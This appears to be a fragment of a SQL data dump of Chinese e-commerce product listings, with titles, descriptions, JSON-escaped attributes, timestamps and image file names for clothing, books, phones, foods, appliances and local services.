('26C82144-FCFB-AA3A-150D-2640FFF623F2', '制ZPLPKK 2017春季新款女士中长款舒适羽绒服修身毛领外套 ', '制ZPLPKK 2017春季新款女士中长款舒适羽绒服修身毛领外套 ', 0, '{\"\\u4e0a\\u5e02\\u5e74\\u4efd\\u5b63\\u8282\":\"2017\\u5e74\\u6625\\u5b63\",\"\\u539a\\u8584\":\"\\u5e38\\u89c4\",\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u7c98\\u80f6\\u7ea4\\u7ef4(\\u7c98\\u7ea4)51% \\u805a\\u916f\\u7ea4\"}', '1484975592', '1548345600', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('28FDD4CE-5DC6-FC44-58EE-47ABB5B33BCF', '四大名著 新课标必读 28000多名读者热评 ', '                    本套丛书包含《红楼梦》《三国演义》《水浒传》《西游记》，这四部著作可谓家喻户晓，在我国有着深远的影响，是汉语文学中不可多得的佳作。其中的故事、场景，已经深深地影响了中国人的思想观念、价值取向。四部著作以其极高的艺术水平、细致的人物刻画和丰富的思想内涵为历代读者所称道。\r\n     本丛书由北京市基层教育骨干教师主编，拥有强大的编写团队（作者均为知名高校中文系博士、硕士），以简洁上口的白话表达，译写、改写；去其糟粕、取其精华，专业插画师在通读文本基础上绘制精美插图，清晰详尽的知识点拓展，双色印刷编排，非常符合青少年阅读心里和阅读习惯。\r\n\r\n     丛书由国内知名的儿童文学作家、上海师范大学教授梅子涵先生写序并推荐。可谓“经典中的经典”。                ', 0, '{\"\\u5370\\u5237\\u65f6\\u95f4\":\"2013\\u5e7409\\u670801\\u65e5\",\"\\u56fd\\u9645\\u6807\\u51c6\\u4e66\\u53f7ISBN\":\"23356962\"}', '1490004693', '1584633600', 'FCDB71E5-E93E-7BBC-6ADD-9DB3EE39B6F4', '0', 1, '7FFEE1F9-2699-D245-92FC-64F3F0CD0DE4.png'),
('2D089988-6636-BF15-676F-15A6AED0433F', '打火机与公主裙 ', '我有我的国王，我是他不二之臣，我愿为他摇旗呐喊 ，也愿为他战死沙场。年度*受欢迎作者Twentine*之作，同名影视剧重磅打造中！ 春风得意每满150减50 文艺分会场>> ', 0, '{\"\\u7248 \\u6b21\":\"1\",\"\\u9875 \\u6570\":\"352\",\"\\u5b57 \\u6570\":\"2000000\",\"\\u56fd\\u9645\\u6807\\u51c6\\u4e66\\u53f7ISBN\":\"9787555247630\",\"\":\"\"}', '1489979760', '1532880000', 'FCDB71E5-E93E-7BBC-6ADD-9DB3EE39B6F4', '0', 1, '6DF8D5B2-81CB-1E08-822D-968B1FB61778.png'),
('37B10231-4225-C269-DB28-F1C40A6CA448', '雪纺白衬衫女长袖韩版休闲百搭职业女装秋冬季加绒加厚保暖衬衣寸', '衬衫', 0, '{\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u805a\\u916f\\u7ea4\\u7ef495% \\u805a\\u6c28\\u916f\\u5f39\\u6027\\u7ea4\",\"\\u670d\\u88c5\\u7248\\u578b\":\"\\u4fee\\u8eab\",\"\\u98ce\\u683c\":\"\\u901a\\u52e4\",\"\\u901a\\u52e4\":\"\\u97e9\\u7248\",\"\\u8863\\u95e8\\u895f\":\" \\u5355\\u6392\\u591a\\u6263\",\"\\u5c3a\\u7801\":\"S M L XL XXL 3XL 4XL\"}', '1484576598', '1486742400', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('38B3FE41-5AB1-F2AF-3446-7E07D8DD8851', '64G/128G顶配【送VR电源+12期分期】Xiaomi/小米 小米Max手机 MIX ', '正品保障，支持官网验货，全国联保！买就送：7H级纳米防爆膜，保护壳，延保一年等！小米MAX配置一览：①:顶配为4G运行内存+128G存储闪存；②:6.44英寸大屏黄金尺寸，④:全网通3.0，4G+；⑤:1600万像素，5片式镜头，f2.0光圈；⑥:4850mAh', 0, '{\"CPU\\u578b\\u53f7\":\"\\u9a81\\u9f99650\",\"\\u4ea7\\u54c1\\u540d\\u79f0:\":\"\\u5c0f\\u7c73Max\",\"\\u7f51\\u7edc\\u7c7b\\u578b:\":\"4G\\u5168\\u7f51\\u901a\",\"\\u952e\\u76d8\\u7c7b\\u578b\":\"\\u865a\\u62df\\u89e6\\u5c4f\\u952e\\u76d8\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"1600\\u4e07\"}', '1484983134', '1611849600', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('3BAADFC7-A792-40D4-6BF3-978F5F868196', '新奇特家庭厨房实用工具日常创意家居生活日用品百货小商品神器 ', '新奇特家庭厨房实用工具日常创意家居生活日用品百货小商品神器 ，砧板款-单托盘 水杯款-单托盘 砧板款', 0, '{\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u7827\\u677f\\u6b3e-\\u5355\\u6258\\u76d8 \\u6c34\\u676f\\u6b3e-\\u5355\\u6258\\u76d8 \\u7827\\u677f\\u6b3e\"}', '1492396196', '1587052800', 'A2AF9D4A-D613-0A44-353C-F015BB16F24A', '0', 1, '6F40E452-3CF1-5C23-3B35-85C4B02DEEDD.png'),
('433DA60D-5065-1301-48B8-76D1BB06CDF0', '现货当天发Huawei/华为 Mate 9 Pro保时捷4G曲屏手机正品mate9pro ', '【华为Mate9Pro原装正品手机现货当天发，下单再送购机豪礼】【收到货晒图分享美照有送好礼哦】(主图具体礼品以套餐为准】', 0, '{\"\\u54c1\\u724c\":\"\\u534e\\u4e3a\",\"cpu\":\"G71 MP8 + \\u5fae\\u667a\\u6838i6\",\"\\u5c4f\\u5e55\\u5c3a\\u5bf8\":\"5.5\\u82f1\\u5bf8 2k\\u53cc\\u66f2\\u9762\",\"\\u6444\\u50cf\\u5934\":\"\\u524d800\\u4e07 + \\u540e2000\\u4e07 + 1200\\u4e07\\u50cf\\u7d20\",\"\\u7535\\u6c60\\u5bb9\\u91cf\":\"4000mah\"}', '1486186369', '1580745600', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('47D002AB-DFA4-11CF-52FB-398122144EF1', '五面取暖器烧烤型家用四面型小太阳全方位烤火器电暖炉电热扇包邮 ', '烧烤型五面烤火炉取暖器升级啦。顶部可调温,烧烤网可直接取下!  普通款特价机:尺寸21*21*37CM ,顶部2根管,无接渣盘。无调温开关,固定脚。网不能直接取下。  顶3管小款烧烤型:顶部3根管,尺寸为21*21*38CM,5面都有调温开关，带接渣盘。轮子脚，5面全开共2200W,顶面烧烤网可以直接取下。  顶3管大款烧烤型:顶部3根管,尺寸为23*23*43CM,5面都有高低调温开关,带接渣盘,轮子脚。5面全开共2200W,顶面烧烤网可以自行取下,  顶4管大款烧烤型:顶面4根管,尺寸为23*23*43CM,5面都有高低调温开关,带接渣盘,轮子脚。5面全开共2400W,顶面烧烤网可以单独取下.  注意:小款的取接渣盘处都有小门条设计,大款都是直接开口的,没有小门条,以图片显示为标准!', 0, '{\"CCC\\u8bc1\\u4e66\\u7f16\\u53f7\":\"2009010707382203\",\"\\u53d6\\u6696\\u5668\\u52a0\\u70ed\\u65b9\\u5f0f\":\"\\u77f3\\u82f1\\u7ba1\\u52a0\\u70ed\",\"\\u667a\\u80fd\\u7c7b\\u578b\":\"\\u4e0d\\u652f\\u6301\\u667a\\u80fd\",\"\\u6700\\u5927\\u91c7\\u6696\\u9762\\u79ef(\\u5e73\\u65b9\\u7c73)\":\"20m^2\\u4ee5\\u4e0b\",\"\\u7535\\u6696\\u5668\\u6700\\u5927\\u529f\\u7387\":\"2000W\\u4ee5\\u4e0a\",\"\\u6863\\u4f4d\":\"5\\u6863\\u53ca\\u4ee5\\u4e0a\"}', '1486198318', '1580745600', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('4CF00EB1-8CBA-C3D9-F93F-DF01511391BE', '原封现货 现货速发Meizu/魅族 魅蓝X全网通4G八核智能手机 ', '                    全新白色现货！！送包邮+延保！！推荐选购套餐，搭使用更方便。 拒绝黄牛，每人限购1台相同类似地址多拍只发一台！双I2活动，现货大礼！！                ', 3, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"Meizu\\/\\u9b45\\u65cf \\u9b45\\u84ddX\",\"CPU\\u54c1\\u724c\":\"\\u8054\\u53d1\\u79d1\",\"CPU\\u578b\\u53f7\":\"Helio P20\",\"\\u5c4f\\u5e55\\u5c3a\\u5bf8\":\"5.5\\u82f1\\u5bf8\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"1200\\u4e07\",\"\\u8fd0\\u884c\\u5185\\u5b58RAM\":\"3GB\",\"\\u5b58\\u50a8\\u5bb9\\u91cf\":\"32GB\"}', '1487260706', '1581782400', '035979B6-A44A-32EA-646F-28A51C607A73', '7', 1, '7E70998B-C25C-BC33-971E-2E788CE80504.png'),
('511676D4-6E5E-A943-02D2-23838D8A4B2A', '卡丝拉狄 中年大衣女装中国风撞色绣花立领长袖宽松毛呢女士外套 ', '卡丝拉狄 中年大衣女装中国风撞色绣花立领长袖宽松毛呢女士外套 ', 0, '{\"\\u6d41\\u884c\\u5143\\u7d20\\/\\u5de5\\u827a\":\"\\u7ee3\\u82b1\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u9ec4\\u8272 \\u9ed1\\u8272 \\u84dd\\u8272\",\"\\u9886\\u5b50\":\"\\u7acb\\u9886\",\"\\u901a\\u52e4\":\"\\u97e9\\u7248\",\"\\u8863\\u95e8\\u895f\":\"\\u4e00\\u7c92\\u6263\",\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u7f8a\\u6bdb50% \\u805a\\u916f\\u7ea4\\u7ef450%\"}', '1484978091', '1585843200', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('54BD8F84-B0F0-2F73-E5AE-DFB102E48C79', '团东村雅王坡冬瓜大户黑皮大冬瓜现可预购！【冬瓜大！圆又长，瓜皮黑，绝对惊艳到你！】', '                                        团东村雅王坡冬瓜大户黑皮大冬瓜现可预购！【冬瓜大！圆又长，瓜皮黑，绝对惊艳到你！】！有意向大老板可以点击上方【联系瓜农】致电瓜农，询问更加详细的信息，约定合适的时间看瓜！                                ', 0, '{\"\\u74dc\\u957f\":\"1M\",\"\\u74dc\\u91cd\":\"100\\u65a4\\/\\u4e2a\"}', '1526005610', '1559145600', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 0, '6C7B2C0C-F77D-639B-65E3-466A42D1B85C.png'),
('5CA23A19-E354-364B-17A8-0E98A7DB53D0', '大量农家青辣椒！欢迎致电订购！！', '                    团东村雅王坡辣椒大户！大量青辣椒现可预购！】！有意向的老板可以点击上方【联系瓜农】致电询问更加详细的信息！                ', 0, '{\"\\u8fa3\\u6912\\u91cf\":\"3\\u5428\"}', '1526006194', '1620662400', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 0, 'EA1DEF93-83AB-8047-A8A8-B47DA7A61A89.png'),
('61F54F17-89B5-A2B6-2A20-353A55A4F6D5', '愿你的青春无所畏惧，勇往直前 ', '一部让你在青春十字路口找到努力方向、学会规划人生、懂得设计未来的暖心之作！不曾努力的青春，那是虚度光阴；未曾拼搏的岁月，那是浪费生命！鹿晗、邓超、李晨、乐嘉备受推崇的人生信条！', 0, '{\"\\u5370\\u5237\\u65f6\\u95f4\":\"2016\\u5e7409\\u670815\\u65e5\",\"\\u9875 \\u6570\":\"386\",\"\\u56fd\\u9645\\u6807\\u51c6\\u4e66\\u53f7ISBN\":\"9787510146312\"}', '1490061187', '1553875200', 'FCDB71E5-E93E-7BBC-6ADD-9DB3EE39B6F4', '0', 1, 'D4FD3044-112E-265B-8460-E3C4141290AE.png'),
('6275F89C-A2A1-8B7B-A259-94926A84C442', '良品铺子手造麻薯干吃汤圆糕点点心特产美食小吃零食大礼包 组合', '良品铺子祝大家新春快乐大吉大利 咕叽咕叽 ', 0, '{\"\\u751f\\u4ea7\\u8bb8\\u53ef\\u8bc1\\u7f16\\u53f7\":\"QS4401 2401 2230 \",\"\\u50a8\\u85cf\\u65b9\\u6cd5\":\"\\u8bf7\\u7f6e\\u4e8e\\u9634\\u51c9\\u5e72\\u71e5\\u5904\",\"\\u4fdd\\u8d28\\u671f\":\"180 \\u5929\",\"\\u98df\\u54c1\\u6dfb\\u52a0\\u5242\":\"\\u5355\\uff0c\\u53cc\\u7518\\u6cb9\\u8102\\u80aa\\u9178\\u916f\",\"\\u51c0\\u542b\\u91cf\":\"1050g\"}', '1486187304', '1517673600', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('629BAE4F-B30D-D852-BFE6-A43A373A2ED8', '家庭居家宿舍寝室必备懒人神器实用创意家居生活日用品小百货商品 ', '自动挤牙膏套装，漱口杯，自动挤牙膏，牙膏家三合一。爱上刷牙，而且是很漂亮的摆件，安装简单，拆洗容易，质量保证，送朋友很好的礼物', 0, '{\"\\u54c1\\u724c\":\"\\u9752\\u9f99\\u9999\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u89c1\\u89c4\\u683c\"}', '1486199874', '1517673600', 'D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('63D87121-EC06-A576-DE0F-386A49F4243B', '家庭日常创意实用家居用品居家必备生活日用品小百货宿舍寝室神器 ', '                     运费险\r\n    买卖双方在交易未完结前，买家发起退货请求时，保险公司会对退货产生的单程运费提供保险服务\r\n\r\n木质DIY收纳盒,超大实用经典款式(带把手+送化妆镜+手机支架支架)\r\n极有家认证[优质网店]：1年好店，权威认证，买退无忧                                ', 0, '{\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u4e73\\u767d\\u8272 \\u7c73\\u767d\\u8272 \\u9ed1\\u8272 \\u7c89\\u7ea2\\u8272 \\u85d5\\u8272 \\u897f\\u74dc\"}', '1491621108', '1527609600', 'A2AF9D4A-D613-0A44-353C-F015BB16F24A', '0', 1, '0F5B584C-3ED7-B315-8E7B-C147CF8C224B.png'),
('6D025479-654E-5D3F-2B6D-ECF783A2D918', '骆驼男装 2017春季新品青年时尚立领商务休闲外套纯色运动风衣男 ', '骆驼男装 2017春季新品青年时尚立领商务休闲外套纯色运动风衣男 ', 0, '{\"\\u54c1\\u724c\":\"Camel\\/\\u9a86\\u9a7c\",\"\\u57fa\\u7840\\u98ce\\u683c\":\"\\u65f6\\u5c1a\\u90fd\\u5e02\",\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u68c9100%\",\"\\u4e0a\\u5e02\\u5e74\\u4efd\\u5b63\\u8282\":\"2017\\u5e74\\u6625\\u5b63\"}', '1484978236', '1390320000', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('6FFC6691-7F05-8AB8-B1E1-5C839BB4F446', '正版钢铁是怎样炼成的 原著经典世界名著外国外小说文学青少版 少儿童书籍畅销书阅读 初中学生小学生课外必读物图书', '《钢铁是怎样炼成的》被誉为“影响历史的百部经典之一”，“影响中国近代社会的经典译作”。保尔那顽强坚韧，奋发向上的人格力量，对我们的青少年，对我们的民族来说，是永远具有特殊意义的宝贵财富', 0, '{\"     \\u4ea7\\u54c1\\u540d\\u79f0\":\"\\u94a2\\u94c1\\u662f\\u600e\\u6837\\u70bc\\u6210\\u7684\",\"\\u51fa\\u7248\\u793e\\u540d\\u79f0\":\"\\u4e2d\\u56fd\\u6587\\u8054\\u51fa\\u7248\\u793e\",\"\\u4f5c\\u8005\":\"\\u5965\\u65af\\u7279\\u6d1b\\u592b\\u65af\\u57fa\",\"ISBN\\u7f16\\u53f7\":\"9787519006129\"}', '1484925988', '1486742400', 'FCDB71E5-E93E-7BBC-6ADD-9DB3EE39B6F4', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('72387161-B237-7FC1-3FB3-E78C23533C5C', '韩国the saem得鲜口红不脱色咬唇妆哑光豆沙色唇膏大红姨妈色雾面 ', '这款只能按出，不能按进，用多少按多少，千万不要为了满足自己好奇心狂按，否则口红就回去不了哦', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"The Saem\",\"\\u662f\\u5426\\u4e3a\\u7279\\u6b8a\\u7528\\u9014\\u5316\\u5986\\u54c1\":\"\\u5426\",\"\\u529f\\u6548\":\"\\u6ecb\\u6da6 \\u4fdd\\u6e7f\",\"\\u9002\\u5408\\u80a4\\u8d28\":\"\\u4efb\\u4f55\\u80a4\\u8d28\",\"\\u4fdd\\u8d28\\u671f\":\"3\\u5e74\"}', '1486200570', '1517673600', 'F994FC1C-7A5F-16A6-70E4-1672633B13D6', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E', 'Apple/苹果 iPhone 6s Plus 苹果6S 5.5香港/美国/官换全新 ', '支持花呗分期 购买送膜+手机壳 iPhone6S五大预测：1，机身材质采用7000铝合金，不再出现弯曲门。2，屏幕加入Force Touch压感触控技术。3，全新A9处理器CPU及GPU。4，2GB的RAM搭配IOS9。5，全新的1200万像素主摄像头。', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"Apple\\/\\u82f9\\u679c iPhone 6s Plus\",\"\\u5c4f\\u5e55\\u5c3a\\u5bf8\":\"5.5\\u82f1\\u5bf8\",\"\\u4e0a\\u5e02\\u65f6\\u95f4\":\"2015\\u5e749\\u6708\",\"CPU\\u54c1\\u724c\":\"Apple\\/\\u82f9\\u679c\",\"CPU\\u578b\\u53f7\":\"\\u5176\\u4ed6\",\"Apple\\u578b\\u53f7\":\"iPhone 6s Plus\",\"\\u7f51\\u7edc\\u7c7b\\u578b\":\"4G+\\u5168\\u7f51\\u901a\",\"\\u673a\\u8eab\\u989c\\u8272\":\"\\u73ab\\u7470\\u91d1 \\u9ed1\\u8272 \\u94f6\\u8272 \\u91d1\\u8272\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"1200\\u4e07\",\"\\u64cd\\u4f5c\\u7cfb\\u7edf\":\"IOS9\",\"\\u5b58\\u50a8\\u5bb9\\u91cf\":\"16GB 64GB 128GB\",\"\\u539a\\u5ea6\":\"7.3\\u6beb\\u7c73\\uff080.29\\u82f1\\u5bf8\\uff09\",\"\\u5206\\u8fa8\\u7387\":\"1920 x 1080 \\u50cf\\u7d20\\u5206\\u8fa8\\u7387\"}', '1484979335', '1514563200', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('753C793E-1F5D-1DC7-4103-A23D23E016C2', '歌莉娅女装 2017春季新品V领长袖毛呢外套长款171R6E490 ', '歌莉娅女装 2017春季新品V领长袖毛呢外套长款171R6E490 ', 0, '{\"\\u8d27\\u53f7\":\"171R6E490\",\"\\u670d\\u88c5\\u7248\\u578b\":\" \\u76f4\\u7b52\",\" \\u76f4\\u7b52\":\"\\u6697\\u6263\",\"\\u6697\\u6263\":\"\\u6697\\u6263\"}', '1484977693', '1581091200', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('76B76EF4-179E-352C-2A1B-1A7020C43172', '好欢螺螺蛳粉柳州正宗广西螺丝粉', '全部是现炒，下单后三十分钟内送达', 0, '{\"\\u751f\\u4ea7\\u8bb8\\u53ef\\u8bc1\\u7f16\\u53f7\":\"QS4502 0701 0012 \",\"\\u57ce\\u5e02\":\"\\u67f3\\u5dde\\u5e02\"}', '1492395763', '1587052800', 'E310BC0C-CBB9-5D9B-B198-EE79D1D2A875', '0', 1, 'B2B2D4E9-5D18-7566-E027-82FCD3173B87.png'),
('77EEE012-05EE-A678-1E84-C30C7FE185AD', '电脑维修、装系统上门服务', '笔记本台式/win7/8/10/苹果mac/双系统远程电脑维修安装软件重装 ，价格从优，坡上坡下南校区都可以上门服务！', 1, '{\"\\u7c7b\\u578b\":\"\\u7535\\u8111\\u7ef4\\u4fee\\u3001\\u88c5\\u7cfb\\u7edf\"}', '1492395143', '1592323200', 'D85D8F1F-D978-E0E3-DEE5-6B6F1C93255A', '0', 1, '73F62148-264B-09AF-1517-BDEE033B9654.png'),
('89C19CC9-AADE-EF8F-3D2A-FD244AC2C51D', '御食园茯苓夹饼500g北京特产传统茯苓饼美食小吃糕点心零食品', '                    御食园多口味茯苓夹饼！独立小包装！                ', 0, '{\"\\u4fdd\\u8d28\\u671f\":\"360\",\"\\u51c0\\u542b\\u91cf\":\"500g\"}', '1487261350', '1518796800', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '55C34CAB-6FAD-608F-7778-C2DAE4819FD9.png'),
('8AF4E387-5D09-9D99-DBC7-A22396BE2E51', '日本原装进口二手钢琴雅马哈YAMAHA u1E正品保障特价直销99成新 ', '品牌: Yamaha/雅马哈\r\n型号: U1E\r\n款式: 立式\r\n键数: 88键\r\n材质: 鱼鳞松\r\n高度: 121cm\r\n适用对象: 初学者 家庭教学 专业院校\r\n', 0, '{\"\\u54c1\\u724c\":\"Yamaha\\/\\u96c5\\u9a6c\\u54c8\",\"\\u9ad8\\u5ea6\":\"121cm\",\"\\u952e\\u6570\":\"88\\u952e\"}', '1492394860', '1499270400', '7629D45C-386F-E1B0-F529-F268771CE43D', '0', 1, 'CE361AB3-1448-5DE8-92E1-877BE816A1F5.png'),
('8C5CBC3B-C3A0-F078-2DC1-DD276D203A5E', '新品现货 Meizu/魅族 魅蓝note5全网通4G智能手机note5', '全新白色16G现货！！送快递包邮+延保一年！！推荐选购套餐，搭使用更方便。 拒绝黄牛，每人限购1台相同类似地址多拍只发一台！', 0, '{\"\\u673a\\u8eab\\u989c\\u8272\":\"\\u5168\\u7f51\\u901a\\u767d\\u8272\",\"\\u9b45\\u65cf\\u578b\\u53f7\":\"\\u9b45\\u84ddnote5\",\"\\u5206\\u8fa8\\u7387\":\"1920x1080\",\"\\u8fd0\\u884c\\u5185\\u5b58RAM\":\" 3GB 4GB\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"1300\\u4e07\"}', '1484983552', '1548259200', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('900AA834-8BF4-9826-3239-01487EF71BED', '卡丝拉狄 中年大衣女装中国风撞色绣花立领长袖宽松毛呢女士外套 ', '卡丝拉狄 中年大衣女装中国风撞色绣花立领长袖宽松毛呢女士外套 ', 0, '{\"\\u6d41\\u884c\\u5143\\u7d20\\/\\u5de5\\u827a\":\"\\u7ee3\\u82b1\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u9ec4\\u8272 \\u9ed1\\u8272 \\u84dd\\u8272\",\"\\u9886\\u5b50\":\"\\u7acb\\u9886\",\"\\u901a\\u52e4\":\"\\u97e9\\u7248\",\"\\u8863\\u95e8\\u895f\":\"\\u4e00\\u7c92\\u6263\",\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u7f8a\\u6bdb50% \\u805a\\u916f\\u7ea4\\u7ef450%\"}', '1484978092', '1585843200', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('92BAFEFD-CCE6-03EF-60A8-DF9954DDDCA9', '湖南特产麻辣猪蹄熟食 香辣猪脚卤味特色肉类零食真空装美食小吃 ', '                    湖南特产麻辣猪蹄熟食 香辣猪脚卤味特色肉类零食真空装美食小吃                ', 0, '{\"\\u51c0\\u542b\\u91cf\":\"210g\",\"\\u4fdd\\u8d28\\u671f\":\"15\"}', '1487261632', '1550332800', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, 'A51923DC-1E6E-FC0D-C7CD-567C80F1B40C.png'),
('934AE8D8-B061-C383-3FE1-6566C597B7F4', '明治雪吻草莓绿茶牛奶可可豆年货巧克力62g 送男女友批发小吃零食 ', '巧克力', 0, '{\"\\u50a8\\u85cf\\u65b9\\u6cd5\":\"\\u7f6e\\u4e8e\\u9634\\u51c9\\u5e72\\u71e5\\u5904\",\"\\u6210\\u5206\\u542b\\u91cf\":\"26%\",\"\\u98df\\u54c1\\u53e3\\u5473\":\"\\u725b\\u5976\\u53e3\\u5473 \\u8349\\u8393\\u53e3\\u5473 \\u7cbe\\u9009\\u53ef\\u53ef\",\"\\u5305\\u88c5\\u79cd\\u7c7b\":\"\\u76d2\\u88c5\",\"\\u662f\\u5426\\u542b\\u6709\\u4ee3\\u53ef\\u53ef\\u8102\":\"\\u5426\",\"\\u4ea7\\u5730\":\"\\u4e2d\\u56fd\\u5927\\u9646\",\"\\u4fdd\\u8d28\\u671f\":\"300\\u5929\"}', '1484577647', '1486742400', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('96A28FC7-E21C-2185-D3BC-4DD5FE91ADB7', 'SPAO明星AOA同款女式休闲高领套头毛衣韩版针织衫线衫SAKW64TG04 ', '毛衣', 0, '{\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u805a\\u4e19\\u70ef\\u8148\\u7ea4\\u7ef4(\\u8148\\u7eb6)100%\",\"\\u8863\\u957f\":\"\\u5e38\\u89c4\\u6b3e\",\"\\u8896\\u957f\":\"\\u957f\\u8896\",\"\\u54c1\\u724c\":\"SPAO\",\"\\u5c3a\\u7801\":\"S M L\"}', '1484578225', '1486742400', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('AE6D4A9D-7257-836A-2687-8EE3B440594E', 'BONOSIDAN 水光补水面膜10片 白皙补水保湿滋润嫩肤水光针面膜 ', 'BONOSIDAN 水光补水面膜10片 白皙补水保湿滋润嫩肤水光针面膜 ', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"BONOSIDAN\",\"\\u9762\\u819c\\u5206\\u7c7b\":\"\\u8d34\\u7247\\u5f0f\",\"\\u5316\\u5986\\u54c1\\u51c0\\u542b\\u91cf\":\"10\\u7247\",\"\\u54c1\\u540d\":\"\\u6c34\\u5149\\u9762\\u819c\"}', '1486200249', '1549209600', 'F994FC1C-7A5F-16A6-70E4-1672633B13D6', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('B1096A78-4A70-39E0-EBE4-3523CE963812', '【租车】电动车小龟王电瓶车男女成人双人轻便代踏板48V60V72V电动自行车 ', '规格中的价格是一个小时的价格，拍下一件即时租一个小时，拍下两件即租两个小时，依次类推，亲们可以按下单。租车全部送货上门，请亲留意电话通知', 0, '{\"\\u7c7b\\u578b\":\"\\u5404\\u7c7b\\u7535\\u52a8\\u8f66\"}', '1492395472', '1587052800', 'C2CFEB29-044B-1003-2BBA-F0EBF3F1CA3B', '0', 1, '4F68399B-46F7-D022-0CCC-84117F202123.png'),
('B33E6242-90AA-0E1A-17AE-3B2F7C20FBC1', '高端定制ZPLPKK 2017春季新款女士中长款舒适羽绒服修身毛领外套 ', '制ZPLPKK 2017春季新款女士中长款舒适羽绒服修身毛领外套 ', 0, '{\"\\u5145\\u7ed2\\u91cf\":\"100g\\u4ee5\\u4e0b\",\"\\u542b\\u7ed2\\u91cf\":\"50%\"}', '1484975355', '1611158400', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('B4052C46-F17D-CBD1-4BCF-29DF877B6FA5', 'vivo X9前置双摄 全网通4G智能手机 超薄指纹解锁正品分期 vivox9', 'vivo X9前置双摄 全网通4G智能手机 超薄指纹解锁正品分期 vivox9', 1, '{\"\\u5236\\u9020\\u5546\\u540d\\u79f0\":\"\\u7ef4\\u6c83\\u79fb\\u52a8\\u901a\\u4fe1\\u6709\\u9650\\u516c\\u53f8\",\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"TD-LTE\\u6570\\u5b57\\u79fb\\u52a8\\u7535\\u8bdd\\u673a\",\"CPU\\u578b\\u53f7\":\"MSM8953\",\"\\u673a\\u8eab\\u989c\\u8272\":\"\\u91d1\\u8272 \\u73ab\\u7470\\u91d1 \\u661f\\u7a7a\\u7070\",\"\\u5b58\\u50a8\\u5bb9\\u91cf\":\"64G\"}', '1484926494', '1486742400', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('B45A2DB7-6698-C70C-1AD5-94E3E5E7E6A1', 'diy明信片定制lomo卡贺卡定做自制文艺明星片制作创意古风明信片 ', '明信片', 0, '{\"\\u98ce\\u683c\":\"\\u521b\\u610f\\u6f6e\\u6d41\",\"\\u578b\\u53f7\":\"\\u660e\\u4fe1\\u7247\\u5b9a\\u5236\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"350g\\u91d1\\u724c\\u94dc\\u677f\\u5355\\u9762 350g\\u91d1\\u724c\"}', '1484578028', '1486742400', 'D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
